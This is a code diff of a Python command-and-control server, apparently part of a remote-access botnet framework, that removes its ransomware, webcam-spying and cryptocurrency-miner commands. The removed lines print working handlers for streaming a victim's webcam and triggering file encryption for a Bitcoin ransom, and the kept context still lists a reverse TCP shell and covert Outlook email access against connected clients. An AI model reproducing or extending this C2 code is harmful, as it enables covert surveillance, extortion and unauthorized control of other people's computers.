@@ -33,10 +33,6 @@ import core.security as security
 
 # packages
 try:
-    import cv2
-except ImportError:
-    util.log("Warning: missing package 'cv2' is required for 'webcam' module")
-try:
     import colorama
 except ImportError:
     sys.exit("Error: missing package 'colorama' is required")
@@ -219,14 +215,6 @@ class C2():
                 'method': self.session_shell,
                 'usage': 'shell <id>',
                 'description': 'interact with a client with a reverse TCP shell through an active session'},
-            'ransom' : {
-                'method': self.session_ransom,
-                'usage': 'ransom [id]',
-                'description': 'encrypt client files & ransom encryption key for a Bitcoin payment'},
-            'webcam' : {
-                'method': self.session_webcam,
-                'usage': 'webcam <mode>',
-                'description': 'capture image/video from the webcam of a client device'},
             'kill' : {
                 'method': self.session_remove,
                 'usage': 'kill <id>',
@@ -291,10 +279,6 @@ class C2():
                 'method': 'you must first connect to a session to use this command',
                 'description': 'list the contents of a directory',
                 'usage': 'ls <path>'},
-            'miner': {
-                'method': 'you must first connect to a session to use this command',
-                'description': 'run cryptocurrency miner in the background',
-                'usage': 'miner <url> <user> <pass>'},
             'outlook': {
                 'method': 'you must first connect to a session to use this command',
                 'description': 'access outlook email in the background',
@@ -715,66 +699,6 @@ class C2():
                 self.display(task.get('result'))
         self._return()
 
-    def session_webcam(self, args=''):
-        """
-        Interact with a client webcam
-
-        `Optional`
-        :param str args:   stream [port], image, video
-
-        """
-        if not self.current_session:
-            util.log( "No client selected")
-            return
-        client = self.current_session
-        result = ''
-        mode, _, arg = args.partition(' ')
-        client._active.clear()
-        if not mode or str(mode).lower() == 'stream':
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            retries = 5
-            while retries > 0:
-                try:
-                    port = random.randint(6000,9999)
-                    s.bind(('0.0.0.0', port))
-                    s.listen(1)
-                    cmd = {"task": 'webcam stream {}'.format(port)}
-                    client.send_task(cmd)
-                    conn, addr = s.accept()
-                    break
-                except:
-                    retries -= 1
-            header_size = struct.calcsize("L")
-            window_name = addr[0]
-            cv2.namedWindow(window_name)
-            data = ""
-            try:
-                while True:
-                    while len(data) < header_size:
-                        data += conn.recv(4096)
-                    packed_msg_size = data[:header_size]
-                    data = data[header_size:]
-                    msg_size = struct.unpack(">L", packed_msg_size)[0]
-                    while len(data) < msg_size:
-                        data += conn.recv(4096)
-                    frame_data = data[:msg_size]
-                    data = data[msg_size:]
-                    frame = pickle.loads(frame_data)
-                    cv2.imshow(window_name, frame)
-                    key = cv2.waitKey(70)
-                    if key == 32:
-                        break
-            finally:
-                conn.close()
-                cv2.destroyAllWindows()
-                result = 'Webcam stream ended'
-        else:
-            client.send_task({"task": "webcam %s" % args})
-            task = client.recv_task()
-            result = task.get('result')
-            client._active.set()
-        return result
-
     def session_remove(self, session_id):
         """
         Shutdown client shell and remove client from database
@@ -856,24 +780,6 @@ class C2():
                 util.display(str(ses.id), color='white', style='normal')
                 self.database._display(ses.info)
                 print()
-
-    def session_ransom(self, args=None):
-        """
-        Encrypt and ransom files on client machine
-
-        `Required`
-        :param str args:    encrypt, decrypt, payment
-
-        """
-        if self.current_session:
-            if 'decrypt' in str(args):
-                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.exportKey())})
-            elif 'encrypt' in str(args):
-                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey())})
-            else:
-                self.current_session.send_task({"task": "ransom {}".format(args)})
-        else:
-            util.log("No client selected")
 
     def session_shell(self, session):
         """
